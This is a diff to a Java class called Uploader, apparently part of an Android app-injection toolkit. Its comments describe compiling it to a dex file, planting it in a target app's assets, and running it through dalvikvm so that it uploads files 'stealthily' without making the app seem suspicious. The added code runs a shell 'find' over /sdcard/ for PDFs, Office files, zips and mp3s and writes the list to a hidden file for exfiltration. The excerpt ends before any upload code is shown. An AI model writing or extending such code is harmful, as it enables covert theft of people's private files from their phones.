@@ -9,26 +9,46 @@ public class Uploader {
     // Uploading some files to http server
     /*
 	 What to do in this class: 
-	 get result list from 'find' command, then upload file(s) stealthily (No foreground delay)
+     get result list from 'find' command, then upload file(s) stealthily (No foreground delay)
+     Command line usage: dalvikvm -cp Uploader.dex Uploader
          
 	 Benefit of using dalvikvm to run codes:
 	 Android app is run under single thread, too much code injected will make the app pauses/lags. 
 	 Shell command, "dalvikvm" Make your program run in background, avoid making the target app laggy, making it suspicious.
-	 
+
 	 What shouldn't be written in this program:
-	 When needing Android libraries (I didn't test, but I guess adding all Android libraries(.jar) to this program is impossible ;/)
+	 When the code needs Android libraries (I didn't test, but I guess adding all Android libraries(.jar) to this program is impossible ;/)
 	 Theoretically, the "dex" file should include all imported libraries (except default java library) 
 	 
-         How to use this class:
-         Easiest way is to find an android ide like AIDE or Java N-IDE, add required libraries, copy and paste this program.
-         Then compile it. Go to ouput/relase folder in your project, find "classes.dex", copy it to target app's assets folder.
+    How to use this class for injection:
+    Easiest way is to find an android ide like AIDE or Java N-IDE, add required libraries, copy and paste this program.
+    Then compile it. Go to the folder (like 'output'/'release' under 'bin' folder) in your project, find "classes.dex", copy it to target app's assets folder.
 	 
 	*/
     public static void main(String[] args) {
-        //parameter args[0]: name of the file [a list of paths (the target file's locations)]
-        File f = new File(args[0]);
+        //preparation work (search for valid files)
+        String extList[] = {
+			".pdf",
+			".doc", 
+			".docx",
+			".ppt",
+			".pptx",
+			".xls", 
+			".xlsx",
+			".zip",
+            ".mp3"};
+        String ext = String.join(" -o -name *", extList);
+        
+        String[] cmds = {"sh", "-c", String.format("find /sdcard/ -name *%s > .r3su1t", ext)};//shell commands
+        
+        
+        //specify the name of the file [a list of paths (the target file's locations)]
+        File f = new File(".r3su1t");
         try
         {
+            //command execution
+            Runtime.getRuntime().exec(cmds).waitFor();
+
             Scanner sc = new Scanner(f);
             ArrayList<String> targets = new ArrayList<String>();
             while(sc.hasNextLine())
